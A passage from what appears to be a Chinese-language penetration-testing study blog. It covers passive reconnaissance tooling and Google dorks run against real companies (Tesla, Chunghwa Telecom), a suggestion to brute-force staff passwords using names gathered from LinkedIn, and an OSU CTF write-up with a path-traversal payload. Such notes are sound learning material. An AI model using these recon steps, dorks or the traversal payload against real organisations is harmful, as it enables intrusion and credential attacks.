class="line">mobile.kronos.tesla.com (FQDN) --&gt; cname_record --&gt; frontend-app-1817070613.us-west-2.elb.amazonaws.com (FQDN)</span><br><span class="line">13.111.0.0/16 (Netblock) --&gt; contains --&gt; 13.111.47.195 (IPAddress)</span><br><span class="line">2610:a1:1014::/48 (Netblock) --&gt; contains --&gt; 2610:a1:1014::245 (IPAddress)</span><br><span class="line">8.45.124.0/24 (Netblock) --&gt; contains --&gt; 8.45.124.215 (IPAddress)</span><br><span class="line">168.245.0.0/17 (Netblock) --&gt; contains --&gt; 168.245.123.10 (IPAddress)</span><br><span class="line">...</span><br><span class="line">2600:9000:2066::/48 (Netblock) --&gt; contains --&gt; 2600:9000:2066:7800:8:f087:d100:93a1 (IPAddress)</span><br><span class="line">2600:9000:2066::/48 (Netblock) --&gt; contains --&gt; 2600:9000:2066:1e00:8:f087:d100:93a1 (IPAddress)</span><br></pre></td></tr></table></figure>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/tomnomnom/httprobe">tomnomnom httprobe</a> 探測提供列表</p>
<ul>
<li>確認該網頁是真是假</li>
<li>可以把sublist3r掃出網域丟給它驗證</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">輸出domain.txt中的目標網域訊息並給httprobe執行</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domain.txt | httprobe</span><br><span class="line"></span><br><span class="line">預設情況下，httprobe 檢查連接埠 80 上的 HTTP 和連接埠 443 上的 HTTPS。</span><br><span class="line">透過指定協定和連接埠對，使用 -p 標誌新增其他偵測器：</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domain.txt | httprobe -p http:81 -p https:8443</span><br><span class="line"></span><br><span class="line">設置進程數 -c</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domains.txt | httprobe -c 50</span><br><span class="line"></span><br><span class="line">使用 -t 標誌並指定逾時（以毫秒為單位）來變更逾時：</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domains.txt | httprobe -t 20000</span><br><span class="line"></span><br><span class="line">不想在連接埠 80 上探測 HTTP 或在連接埠 443 上探測 HTTPS，則可以使用 -s 標誌</span><br><span class="line">使用 -p 標誌指定您想要的探測器</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domains.txt | httprobe -s -p https:8443</span><br><span class="line"></span><br><span class="line">不關心檢查 HTTPS 是否正常運作。您可以使用 --prefer-https 標誌來做到這一點：</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domains.txt | httprobe --prefer-https</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Identifying-Website-Technologies"><a href="#Identifying-Website-Technologies" class="headerlink" title="Identifying Website Technologies"></a><strong>Identifying Website Technologies</strong></h3><p>查看網站使用服務、網頁框架、操作系統、程式語言…</p>
<ul>
<li>透過版本查找漏洞</li>
<li><a target="_blank" rel="noopener" href="https://builtwith.com/">https://builtwith.com/</a></li>
</ul>
<p><img src="/img/passive_Untitled_30.png" alt="Untitled"></p>
<p><img src="/img/passive_Untitled_31.png" alt="Untitled"></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://chromewebstore.google.com/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=zh-TW">wappalyer</a></li>
</ul>
<p><img src="/img/passive_Untitled_32.png" alt="Untitled"></p>
<ul>
<li>whatweb 查看更多網站資訊</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/httprobe/script]</span><br><span class="line">└─# whatweb https://www.cht.com.tw/</span><br><span class="line">https://www.cht.com.tw/ [302 Found] Access-Control-Allow-Methods[GET,POST], Cookies[UqZBpD3n3iPIDwJU9DmYiW2UWf8W+5RO], Country[TAIWAN; REPUBLIC OF CHINA (ROC)][TW], HTTPServer[HiNetCDN/2310], IP[203.66.32.44], RedirectLocation[https://www.cht.com.tw/home/consumer], Strict-Transport-Security[max-age=31536000], Title[文件已移動], UncommonHeaders[access-control-allow-methods,access-control-allow-headers,x-request-id], X-Frame-Options[SAMEORIGIN]</span><br><span class="line">https://www.cht.com.tw/home/consumer [200 OK] ASP_NET, Access-Control-Allow-Methods[GET,POST], Cookies[AAREFRZ,ASP.NET_SessionId,BPSCBFG,CEWQETV,HWERQTS,NOFSDGV,SC_ANALYTICS_GLOBAL_COOKIE,UqZBpD3n3iPIDwJU9DmYiW2UWf8W+5RO,expires], Country[TAIWAN; REPUBLIC OF CHINA (ROC)][TW], Frame, HTML5, HTTPServer[HiNetCDN/2310], HttpOnly[AAREFRZ,ASP.NET_SessionId,BPSCBFG,CEWQETV,HWERQTS,NOFSDGV,SC_ANALYTICS_GLOBAL_COOKIE,expires], IP[203.66.32.102], Open-Graph-Protocol[website], Script[text/javascript], SiteCore, Strict-Transport-Security[max-age=31536000], Title[中華電信 - 5G行動上網通話、HiNet光世代寬頻上網/市話、MOD影視娛樂及智慧生活應用 | 中華電信網路門市CHT.com.tw], UncommonHeaders[access-control-allow-origin,content-security-policy,access-control-allow-methods,access-control-allow-headers,x-request-id], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=Edge]</span><br></pre></td></tr></table></figure>

<h3 id="Information-Gathering-with-Burp-Suite"><a href="#Information-Gathering-with-Burp-Suite" class="headerlink" title="Information Gathering with Burp Suite"></a><strong>Information Gathering with Burp Suite</strong></h3><ul>
<li><p>Burp Suite</p>
<ul>
<li><p>先去設定FireFox &gt; 側欄找到setting &gt; General &gt; 滑到最底下的Network Proxy&gt;Settings</p>
<p>  <img src="/img/passive_Untitled_33.png" alt="Untitled"></p>
<p>  <img src="/img/passive_Untitled_34.png" alt="Untitled"></p>
</li>
<li><p>再瀏覽器搜尋<a target="_blank" rel="noopener" href="https://burp/">https://burp/</a> &gt; 點擊CA Certificate</p>
</li>
</ul>
<p>  <img src="/img/passive_Untitled_35.png" alt="Untitled"></p>
<ul>
<li><p>回到FireFox Setting &gt; Privacy &amp; Security &gt; Security &gt; View Certificate &gt; Import cacert.der &gt; 兩選項都打勾</p>
</li>
<li><p>開啟Burp Suite <code>Intercept is on</code> &gt;搜索目標網站&gt;Burp Suite會顯示該網站資訊</p>
<p>  <img src="/img/passive_Untitled_36.png" alt="Untitled"></p>
</li>
<li><p>可以按Forward繼續看到網頁內容，並擷取到其他頁面資訊</p>
</li>
<li><p>點擊Target</p>
<ul>
<li>當前已載入過的頁面</li>
<li>攔截的流量</li>
<li>當下點擊目標頁面中的其他連結也會即時刷新此處資訊</li>
</ul>
<p>  <img src="/img/passive_Untitled_37.png" alt="Untitled"></p>
<ul>
<li>Response 會看到更多詳盡資訊</li>
</ul>
<p>  <img src="/img/passive_Untitled_38.png" alt="Untitled">
  </p>
</li>
<li><p>Burp suite Pro 才有主動掃描功能</p>
</li>
</ul>
<p>  <img src="/img/passive_Untitled_39.png" alt="Untitled"></p>
</li>
</ul>
<h3 id="Google-Fu"><a href="#Google-Fu" class="headerlink" title="Google Fu"></a><strong>Google Fu</strong></h3><ul>
<li>語法搜索<ul>
<li><p><a target="_blank" rel="noopener" href="https://ahrefs.com/blog/google-advanced-search-operators/">https://ahrefs.com/blog/google-advanced-search-operators/</a></p>
</li>
<li><p>控制搜索網域</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">site:tesla.com **-www -ir**</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索所有有關tesla.com的內容，但網域名稱不含www,ir</span></span><br><span class="line"><span class="comment"># &#x27;-&#x27;是不要網域中出現特定字串</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查詢該網域下有的指定類型內容</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">site:tesla.com filetype:docx</span><br></pre></td></tr></table></figure>
<p>  <img src="/img/passive_Untitled_40.png" alt="Untitled"></p>
</li>
<li><p>搜尋快取頁面</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cache:tesla.com</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>基礎運算子</p>
<table>
<thead>
<tr>
<th>符號</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>• 在關鍵字前：搜尋所有包含關鍵字的資料</td>
</tr>
<tr>
<td>EX：”教育部”+體育</td>
<td></td>
</tr>
<tr>
<td>• 在關鍵字後：作為血型查詢</td>
<td></td>
</tr>
<tr>
<td>EX：AB+</td>
<td></td>
</tr>
<tr>
<td>• 其他位置：直接被忽略</td>
<td></td>
</tr>
<tr>
<td>$</td>
<td>• 搜尋內容有符合價格的網頁</td>
</tr>
<tr>
<td>EX：iPhone $15000</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>• 在關鍵字前：搜尋結果中”排除”含有關鍵字的資料</td>
</tr>
<tr>
<td>EX：要找搜尋引擎，但要排除google、yahoo和bing</td>
<td></td>
</tr>
<tr>
<td>條件式：搜尋引擎 -google -yahoo -bing</td>
<td></td>
</tr>
<tr>
<td>~</td>
<td>• 搜尋關鍵字的相關同義字</td>
</tr>
<tr>
<td>EX：要找摩托車的所有相關同義字(機車)</td>
<td></td>
</tr>
<tr>
<td>條件式：~摩托車</td>
<td></td>
</tr>
<tr>
<td>“ “</td>
<td>強制限定關鍵字文字內容的順序(必須與關鍵字相吻合)</td>
</tr>
<tr>
<td>.</td>
<td>• 表示任何㇐個字元(包括空格及無物)</td>
</tr>
<tr>
<td>• 僅適用於英數字的關鍵字條件搜尋</td>
<td></td>
</tr>
<tr>
<td>EX：Tain.n city</td>
<td></td>
</tr>
<tr>
<td>• 用在排除的關鍵字：會被當成句點而非任意字元</td>
<td></td>
</tr>
<tr>
<td>EX：搜尋引擎 -goo.le -yahoo -bing</td>
<td></td>
</tr>
<tr>
<td>*</td>
<td>• 表示任何㇐個字元(含)以上</td>
</tr>
<tr>
<td>• 位置㇐定要在兩個文字之間</td>
<td></td>
</tr>
<tr>
<td>EX：”大學*考”</td>
<td></td>
</tr>
<tr>
<td>• 用在排除的關鍵字：會被當成星號而非任意字串</td>
<td></td>
</tr>
<tr>
<td>EX：搜尋引擎 -g*e -yahoo -bing</td>
<td></td>
</tr>
<tr>
<td>..</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td>• 放在兩數字之間：表示在此範圍內的數字或金錢</td>
</tr>
<tr>
<td>EX：檯燈 $1000..$2000</td>
<td></td>
</tr>
<tr>
<td>OR</td>
<td></td>
</tr>
<tr>
<td>• 功用：搜尋關鍵字組合群的其中之㇐關鍵字(聯集)</td>
<td></td>
</tr>
<tr>
<td>• 使用時㇐般會搭配圓括弧做限定</td>
<td></td>
</tr>
<tr>
<td>EX：台灣(“大學”</td>
<td>”科技”)</td>
</tr>
</tbody></table>
<p>進階運算子</p>
<table>
<thead>
<tr>
<th>運算子</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>intitle 和 allintitle</td>
<td>搜尋網頁的標題內容</td>
</tr>
<tr>
<td>intext 和 allintext</td>
<td>搜尋網頁的本文、論壇的內文或新聞內容</td>
</tr>
<tr>
<td>inurl 和 allinurl</td>
<td>搜尋網頁的URL內容</td>
</tr>
<tr>
<td>inanchor 和</td>
<td></td>
</tr>
<tr>
<td>allinanchor</td>
<td>搜尋網頁上的連結文字，而回傳該連結所指向的網頁</td>
</tr>
<tr>
<td>link</td>
<td>搜尋網頁中的連結</td>
</tr>
<tr>
<td>filetype 和 ext</td>
<td>搜尋特定類型的檔案</td>
</tr>
<tr>
<td>site</td>
<td>限制搜尋的對象，必須來自指定的網址或網域</td>
</tr>
<tr>
<td>Daterange</td>
<td></td>
</tr>
<tr>
<td>after 和 before</td>
<td>過濾在特定時間內被Google編入索引的網頁</td>
</tr>
<tr>
<td>cache</td>
<td>搜尋Google頁庫存檔中最近㇐次歸檔的網頁</td>
</tr>
<tr>
<td>related</td>
<td>查詢和指定的網址或URL有關聯的網頁</td>
</tr>
<tr>
<td>numrange</td>
<td>搜尋有指定範圍內數值的網頁</td>
</tr>
<tr>
<td>define</td>
<td>搜尋術語的定義</td>
</tr>
<tr>
<td>location 和 source</td>
<td>縮減新聞資料的搜尋範圍(常用在新聞搜尋)</td>
</tr>
<tr>
<td>daterange</td>
<td>• 日期數值只能輸入儒略日(Julian date)</td>
</tr>
<tr>
<td>• 語法：</td>
<td></td>
</tr>
<tr>
<td>daterange：start_date-end_date</td>
<td></td>
</tr>
<tr>
<td>• 儒略日網址：</td>
<td></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://ytliu0.github.io/ChineseCalenda">https://ytliu0.github.io/ChineseCalenda</a></td>
<td></td>
</tr>
<tr>
<td>r&#x2F;Julian_chinese.html</td>
<td></td>
</tr>
<tr>
<td>• 要搭配其他運算子使用(但link除外)</td>
<td></td>
</tr>
<tr>
<td>after 和 before</td>
<td>• 語法：</td>
</tr>
<tr>
<td>after:start_date before:end_date</td>
<td></td>
</tr>
<tr>
<td>• 日期格式：</td>
<td></td>
</tr>
<tr>
<td>西元年-月-日或西元年&#x2F;月&#x2F;日，但不能用 . 區隔</td>
<td></td>
</tr>
<tr>
<td>• Ex:</td>
<td></td>
</tr>
<tr>
<td>自由時報 after:2019-03-01 before:2019-03-05</td>
<td></td>
</tr>
<tr>
<td>• 起始日期晚於最後日期，則搜尋會被忽略</td>
<td></td>
</tr>
<tr>
<td>• 必須要搭配其他運算子使用，單獨使用不會回傳</td>
<td></td>
</tr>
<tr>
<td>任何結果</td>
<td></td>
</tr>
</tbody></table>
<p>感興趣目錄</p>
<table>
<thead>
<tr>
<th>運算子</th>
<th>用途</th>
<th>搜尋方式</th>
</tr>
</thead>
<tbody><tr>
<td>Admin</td>
<td>• 存放管理功能的網頁</td>
<td></td>
</tr>
<tr>
<td>• 目錄可能用admin、administrator、</td>
<td></td>
<td></td>
</tr>
<tr>
<td>administration、adm命名</td>
<td>「inurl:admin」</td>
<td></td>
</tr>
<tr>
<td>「inurl:adm」</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Auth</td>
<td>• 存放分配權限或認證的網頁</td>
<td></td>
</tr>
<tr>
<td>• 目錄可能用auth、authentic、</td>
<td></td>
<td></td>
</tr>
<tr>
<td>authentication命名</td>
<td>「inurl:auth」</td>
<td></td>
</tr>
<tr>
<td>「inurl:authen」</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Backup</td>
<td>存放備份檔案&#x2F;程式版本</td>
<td>「inurl:back」</td>
</tr>
<tr>
<td>「inurl:bak」</td>
<td></td>
<td></td>
</tr>
<tr>
<td>「inurl:bk」</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Conf&#x2F;config&#x2F;settings</td>
<td>組態設定檔</td>
<td>「inurl:conf」</td>
</tr>
<tr>
<td>「inurl:setting」</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Download&#x2F;Files&#x2F;upload</td>
<td>• 檔案上下載的目</td>
<td></td>
</tr>
<tr>
<td>• 檔案儲存的目錄</td>
<td>「inurl:download」</td>
<td></td>
</tr>
<tr>
<td>「inurl:upload」</td>
<td></td>
<td></td>
</tr>
<tr>
<td>「inurl:file」</td>
<td></td>
<td></td>
</tr>
<tr>
<td>logfile</td>
<td>程式或系統日誌檔</td>
<td>「inurl:log」</td>
</tr>
<tr>
<td>「inurl:logfile」</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Login&#x2F;logon&#x2F;sso</td>
<td>系統登入功能的網頁</td>
<td>「inurl:login」</td>
</tr>
<tr>
<td>「inurl:logon」</td>
<td></td>
<td></td>
</tr>
<tr>
<td>manage</td>
<td>存放管理功能的網頁</td>
<td>「inurl:manag」</td>
</tr>
<tr>
<td>「inurl:mgr」</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Temp&#x2F;tmp</td>
<td>暫存區</td>
<td>「inurl:temp」</td>
</tr>
<tr>
<td>「inurl:tmp」71</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="Utilizing-Social-Media"><a href="#Utilizing-Social-Media" class="headerlink" title="Utilizing Social Media"></a><strong>Utilizing Social Media</strong></h3><p>利用社交媒體，查看目標相關資訊</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.linkedin.com/company/tesla-motors/">https://www.linkedin.com/company/tesla-motors/</a></p>
<p>  <img src="/img/passive_Untitled_41.png" alt="Untitled"></p>
</li>
<li><p>從照片中看到人事物，都是值得做資料蒐集的對象</p>
</li>
<li><p>查看該組織人員</p>
<ul>
<li><p>透過人員資訊，也許幾萬名員工中有人密碼是弱密碼</p>
</li>
<li><p>可以利用這些資訊進行帳密爆破 &gt; 人員名稱當作密碼..</p>
<p>  <img src="/img/passive_Untitled_42.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>社交媒體透漏多個個人資訊</p>
</li>
<li><p>深入挖掘訊息並蒐集</p>
</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="osu-osu_ctf" class="article article-type-osu" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/osu_ctf/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.089Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/osu_ctf/">
        OSU CTF
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>內容會慢慢更新…筆記整理中</p>
<h3 id="Web-mikufanpage"><a href="#Web-mikufanpage" class="headerlink" title="Web&#x2F;mikufanpage"></a>Web&#x2F;mikufanpage</h3><p>url: <a target="_blank" rel="noopener" href="https://mikufanpage.web.osugaming.lol/">https://mikufanpage.web.osugaming.lol/</a></p>
<p>這題在察看網頁後，看不出什麼，題目沒有提供太多有用訊息，但有給個網頁的建置檔案<br><img src="/img/osu2.png" alt="osu"></p>
<p>所以在查看網頁原始碼後會注意到 <code>app.js</code> 的內容寫到，僅限制讀取 <code>img</code> 目錄下的 <code>.png</code> 及 <code>.jpg</code><br>意味者須要想個辦法去繞過這限制</p>
<p>題外話，如果想把當前他給的網頁原始碼的檔案建立起來</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/mikufanpage]</span><br><span class="line">└─# npm init</span><br><span class="line">Command &#x27;npm&#x27; not found, but can be installed with:</span><br><span class="line">apt install npm</span><br><span class="line">Do you want to install it? (N/y)y</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~kali/Desktop/mikufanpage]</span><br><span class="line">└─# npm install express --save</span><br><span class="line"></span><br><span class="line">added 64 packages, and audited 65 packages in 2s</span><br><span class="line"></span><br><span class="line">12 packages are looking for funding</span><br><span class="line">  run `npm fund` for details</span><br><span class="line"></span><br><span class="line">found 0 vulnerabilities</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~kali/Desktop/mikufanpage]</span><br><span class="line">└─# node app.js               </span><br><span class="line">mikufanpage running on port 3000</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>(); </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> ?? <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">  </span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">(<span class="params">err</span>) =&gt;</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!err) </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mikufanpage running on port &quot;</span>+ <span class="variable constant_">PORT</span>) </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Err &quot;</span>, err); </span><br><span class="line">&#125;); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/image&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] === <span class="string">&quot;png&quot;</span> || req.<span class="property">query</span>.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] === <span class="string">&quot;jpg&quot;</span>) &#123; <span class="comment">// only allow images</span></span><br><span class="line">        res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="string">&#x27;./img/&#x27;</span> + req.<span class="property">query</span>.<span class="property">path</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Access Denied&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我們可以透過網頁也就是 <code>index.html</code> 內容中有寫到目前在輪流播放的圖片存取位置<br><img src="/img/osu3.png" alt="osu"></p>
<p><code>/image?path=</code> 是個不錯的利用點，讓我想到應該可以利用LFI漏洞將flag.txt噴出來<br>之所以知道flag.txt是在img目錄下是因為題目提供的網頁原始檔中他們放在img目錄下</p>
<p><img src="/img/osu4.png" alt="osu"></p>
<p>開啟burp攔截封包並對url進行測試，其實在測了幾個後發現，常見的做法可能是</p>
<ul>
<li>flag.txt.png</li>
<li>flag.txt%00</li>
</ul>
<p>但這些行不通，路徑中必須包含已經存在的png位置，摸索一番後…</p>
<ul>
<li>miku1.jpg..&#x2F;..&#x2F;..&#x2F;img&#x2F;flag.txt</li>
</ul>
<p><img src="/img/osu1.png" alt="osu"></p>
<ul>
<li>osu{miku_miku_miku_miku_miku_miku_miku_miku_….}</li>
</ul>
<hr>
<h3 id="Reverse-SAT-before-osu"><a href="#Reverse-SAT-before-osu" class="headerlink" title="Reverse&#x2F;SAT-before-osu"></a>Reverse&#x2F;SAT-before-osu</h3><p>題目給了一個檔案需要解開他的謎題</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">b + c + w = 314</span><br><span class="line"></span><br><span class="line">t + d + u = 290</span><br><span class="line"></span><br><span class="line">p + w + e = 251</span><br><span class="line"></span><br><span class="line">v + l + j = 274</span><br><span class="line"></span><br><span class="line">a + t + b = 344</span><br><span class="line"></span><br><span class="line">b + j + m = 255</span><br><span class="line"></span><br><span class="line">h + o + u = 253</span><br><span class="line"></span><br><span class="line">q + l + o = 316</span><br><span class="line"></span><br><span class="line">a + g + j = 252</span><br><span class="line"></span><br><span class="line">q + x + q = 315</span><br><span class="line"></span><br><span class="line">t + n + m = 302</span><br><span class="line"></span><br><span class="line">d + b + g = 328</span><br><span class="line"></span><br><span class="line">e + o + m = 246</span><br><span class="line"></span><br><span class="line">v + v + u = 271</span><br><span class="line"></span><br><span class="line">f + o + q = 318</span><br><span class="line"></span><br><span class="line">s + o + j = 212</span><br><span class="line"></span><br><span class="line">j + j + n = 197</span><br><span class="line"></span><br><span class="line">s + u + l = 213</span><br><span class="line"></span><br><span class="line">q + w + j = 228</span><br><span class="line"></span><br><span class="line">i + d + r = 350</span><br><span class="line"></span><br><span class="line">e + k + u = 177</span><br><span class="line"></span><br><span class="line">w + n + a = 288</span><br><span class="line"></span><br><span class="line">r + e + u = 212</span><br><span class="line"></span><br><span class="line">q + l + f = 321</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>似乎每個方程式都代表字母表中三個字母的總和。我們可以解這些方程式來找出每個字母的數值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, Eq, solve</span><br><span class="line"></span><br><span class="line">a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z = symbols(</span><br><span class="line">    <span class="string">&#x27;a b c d e f g h i j k l m n o p q r s t u v w x y z&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#定義了26個變數，每個變數代表英文字母a到z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定義一個包含多個方程的方程組，每個方程都是形如&quot;字母1 + 字母2 + 字母3 = 數值&quot;的形式。</span></span><br><span class="line">equations = [</span><br><span class="line">    Eq(b + c + w, <span class="number">314</span>),</span><br><span class="line">    Eq(t + d + u, <span class="number">290</span>),</span><br><span class="line">    Eq(p + w + e, <span class="number">251</span>),</span><br><span class="line">    Eq(v + l + j, <span class="number">274</span>),</span><br><span class="line">    Eq(a + t + b, <span class="number">344</span>),</span><br><span class="line">    Eq(b + j + m, <span class="number">255</span>),</span><br><span class="line">    Eq(h + o + u, <span class="number">253</span>),</span><br><span class="line">    Eq(q + l + o, <span class="number">316</span>),</span><br><span class="line">    Eq(a + g + j, <span class="number">252</span>),</span><br><span class="line">    Eq(q + x + q, <span class="number">315</span>),</span><br><span class="line">    Eq(t + n + m, <span class="number">302</span>),</span><br><span class="line">    Eq(d + b + g, <span class="number">328</span>),</span><br><span class="line">    Eq(e + o + m, <span class="number">246</span>),</span><br><span class="line">    Eq(v + v + u, <span class="number">271</span>),</span><br><span class="line">    Eq(f + o + q, <span class="number">318</span>),</span><br><span class="line">    Eq(s + o + j, <span class="number">212</span>),</span><br><span class="line">    Eq(j + j + n, <span class="number">197</span>),</span><br><span class="line">    Eq(s + u + l, <span class="number">213</span>),</span><br><span class="line">    Eq(q + w + j, <span class="number">228</span>),</span><br><span class="line">    Eq(i + d + r, <span class="number">350</span>),</span><br><span class="line">    Eq(e + k + u, <span class="number">177</span>),</span><br><span class="line">    Eq(w + n + a, <span class="number">288</span>),</span><br><span class="line">    Eq(r + e + u, <span class="number">212</span>),</span><br><span class="line">    Eq(q + l + f, <span class="number">321</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用solve函數來解這個方程組，找到符合所有方程式的字母對應數值</span></span><br><span class="line"><span class="comment"># solve(equations, variables)</span></span><br><span class="line">solution = solve(equations)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將字母對應的數值轉換為ASCII字符</span></span><br><span class="line"><span class="keyword">for</span> letter, value <span class="keyword">in</span> solution.items():</span><br><span class="line">    <span class="built_in">print</span>(letter, <span class="built_in">chr</span>(value))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>輸出</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">a o</span><br><span class="line">b s</span><br><span class="line">c u</span><br><span class="line">d &#123;</span><br><span class="line">e 0</span><br><span class="line">f r</span><br><span class="line">g Z</span><br><span class="line">h _</span><br><span class="line">i p</span><br><span class="line">j 3</span><br><span class="line">k P</span><br><span class="line">l p</span><br><span class="line">m Y</span><br><span class="line">n _</span><br><span class="line">o m</span><br><span class="line">p y</span><br><span class="line">q _</span><br><span class="line">r s</span><br><span class="line">s 4</span><br><span class="line">t v</span><br><span class="line">u 1</span><br><span class="line">v o</span><br><span class="line">w R</span><br><span class="line">x &#125;</span><br></pre></td></tr></table></figure>

<p>補充</p>
<ul>
<li>equations 是一個包含了26個方程式的列表，每個方程式表示三個字母的數字和等於一個特定的值。 </li>
<li>variables 則是由我們定義的26個字母變數所組成的清單。</li>
<li>透過呼叫 solve(equations)，嘗試求解方程組，並找到每個字母對應的數字值。</li>
</ul>
<hr>
<h3 id="Web-when-you-dont-see-it"><a href="#Web-when-you-dont-see-it" class="headerlink" title="Web&#x2F;when-you-dont-see-it"></a>Web&#x2F;when-you-dont-see-it</h3><p>題目說在他的profile中有藏flag<br><a target="_blank" rel="noopener" href="https://osu.ppy.sh/users/11118671">https://osu.ppy.sh/users/11118671</a></p>
<p>找了一下，在 F12 &gt; Sources &gt; users &gt; 11118671<br>全域搜尋下找到了flag<br><img src="/img/osu6.png" alt="osu"></p>
<p>然後拿去 base64 decode<br><img src="/img/osu5.png" alt="osu"></p>
<ul>
<li>osu{ok_u_see_me}</li>
</ul>
<hr>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Networking" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Networking/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.088Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Networking/">
        Networking
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Networking-Refresher"><a href="#Networking-Refresher" class="headerlink" title="Networking Refresher"></a>Networking Refresher</h1><hr>
<h2 id="IP-Addresses"><a href="#IP-Addresses" class="headerlink" title="IP Addresses"></a>IP Addresses</h2><ul>
<li><p>linux</p>
<ul>
